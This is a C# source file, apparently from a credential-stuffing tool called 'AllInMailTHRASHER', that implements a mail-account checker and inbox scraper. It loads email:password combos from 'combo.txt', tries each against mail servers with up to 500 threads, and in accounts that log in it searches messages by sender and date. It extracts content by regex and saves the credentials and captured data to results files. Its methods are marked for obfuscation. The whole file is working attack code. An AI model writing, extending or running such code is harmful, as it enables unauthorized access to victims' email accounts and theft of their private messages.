using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace AllInMailTHRASHER.PluginManager
{
    class Container : IPlugin
    {
        public Container(PSettings settings)
        {
            IsWorked = false;
            _pSettings = settings;
        }

        private static object ob = new object();
        private PSettings _pSettings;
        private Thread[] _threads;
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public PSettings GetSettings()
        {
            return _pSettings;
        }
        public bool IsWorked { get; private set; }
        public int Good { get; private set; }
        public int Bad { get; private set; }
        private string Email;
        private string Date;
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Start(string s, string ss)
        {
            if (_pSettings.Threads > 500)
                _pSettings.Threads = 500;
            if (!IsWorked)
            {
                Directory.CreateDirectory("Results");
                Email = s;
                Date = ss;
                _threads = new Thread[_pSettings.Threads];
                IsWorked = true;
                for (int i = 0; i < _pSettings.Threads; i++)
                {
                    _threads[i] = new Thread(Hook) { IsBackground = true };
                    _threads[i].Start();
                }

            }
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Stop()
        {
            foreach (var VARIABLE in _threads)
            {
                VARIABLE.Abort();
            }
            IsWorked = false;
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public string GetName()
        {
            return _pSettings.Name;
        }
        static IEnumerable<string> lines = File.ReadAllLines("combo.txt").Distinct();
        static ConcurrentQueue<string> line = new ConcurrentQueue<string>(lines);
        public static int count = 0;
        public int end = lines.Count();
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Hook()
        {
            while (line.TryDequeue(out var combo))
            {
                var combos = combo.Split(';', ':');
                if (combos.Length != 2)
                {
                    return;
                }
                Check(combos[0], combos[1], Date);
                count++;
                int left = end - count;
                Console.Title = $"Mail Refresher | Left: {left}";
            }
            while ((end - count) != 0)
              {
            Thread.Sleep(100);
              }
            }
        List<Regexes> regexx = new List<Regexes>();
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Check(string email, string pass, string date)
        {
            try
            {
                var combo = email.Split('@');

                var client = ClientConfig.GetMailClient(combo[1]);
                if (!client.Connect())
                    {
                    Bad++;
                    return;
                }
                if (!client.Login(email, pass))
                {
                    Bad++;
                    return;
                }
              var messages = client.GetMessages(Email, DateTime.Parse(date));
                foreach (var message in messages)
                {
                    int index = 0;
                    foreach (var list in _pSettings.list)
                    {
                        index++;
                    switch (list.regexpos)
                    {
                        case "Body":
                                regexx.Add(new Regexes
                                {   index = index,
                                    result = Regex.Match(message.AlternateViews[1].Body, list.regex).Groups[list.group].Value
                                });
                                break;
                        case "Subject":
                                regexx.Add(new Regexes
                                {   index = index,
                                    result = Regex.Match(message.AlternateViews[1].Body, list.regex).Groups[list.group].Value
                                });
                                break;
                        default:
                            break;
                    }
                    }
                     lock (ob)
                    {
                        string caps = _pSettings.Capture.Replace("<EMAIL>", email).Replace("<PASS>", pass).Replace("<Message.Subject>", message.Subject).Replace("<Message.From>", message.From.Address).Replace("<Message.Date>", message.Date.ToShortDateString());
                        caps = getRegex(caps);
                        Console.WriteLine(caps);
                        File.AppendAllText(Directory.GetCurrentDirectory() + "\\Results\\" + _pSettings.FileName + ".txt", _pSettings.FileOutput.Replace("<EMAIL>", email).Replace("<PASS>", pass).Replace("<Message.Subject>", message.Subject).Replace("<Message.From>", message.From.Address).Replace("<Message.Date>", message.Date.ToShortDateString()) + "\r\n");
                    }
               }
            }
            catch { }
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public string getRegex(string cap)
        {
            MatchCollection m = Regex.Matches(cap, "<Regex\\s*\\[([^]])");
            foreach(Match mm in m)
            {
                Dictionary<int, string> x = regexx.ToDictionary(xs => xs.index, p => p.result);
                x.TryGetValue(Convert.ToInt32(mm.Groups[1].Value), out string xsz);
                cap = Regex.Replace(cap, $"<Regex \\[{mm.Groups[1].Value}\\]>", xsz);

            }
            return cap;
        }

    }
    public class Regexes
    {
        public int index { get; set; }
        public string result { get; set; }
    }
}
